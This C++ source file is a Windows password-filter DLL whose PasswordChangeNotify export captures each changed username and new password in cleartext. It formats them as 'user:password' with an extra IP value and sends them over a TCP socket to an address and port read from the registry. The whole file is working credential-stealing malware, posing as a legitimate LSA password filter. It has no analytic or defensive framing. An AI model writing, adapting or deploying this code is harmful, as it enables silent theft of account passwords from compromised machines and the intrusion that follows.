#include "lsanotif.h"
#include "pch.h"


int sendCreds(char* creds)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char* ip = getIPReg(L"ipa");
	DWORD port = getPtReg();

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	printf("Initialised.\n");

	//Create a socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
		goto error;
	}

	printf("Socket created.\n");

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	//Connect to remote server
	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		goto error;
	}

	puts("Connected");

	//Send some data
	if (send(s, creds, strlen(creds), 0) < 0)
	{
		puts("Send failed");
		goto error;
	}
	puts("Data Send\n");

	free(ip);
	return 0;

error:
	free(ip);
	WSACleanup();
	return 1;
}


void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	char* creds = (char*)malloc(150);
	char* eip = getIPReg(L"eip");

	sprintf(creds, "%ws:%ws;end;%s", username->Buffer, password->Buffer, eip);

	int retval = sendCreds(creds);

	free(eip);
	free(creds);
}


// EXPORTS
extern "C" __declspec(dllexport)
BOOL WINAPI InitializeChangeNotify(void)
{
	return TRUE;
}

extern "C" __declspec(dllexport)
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID, PUNICODE_STRING NewPassword)
{
	SavePassword(UserName, NewPassword);
	return TRUE;
}

extern "C" __declspec(dllexport)
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	return TRUE;
}

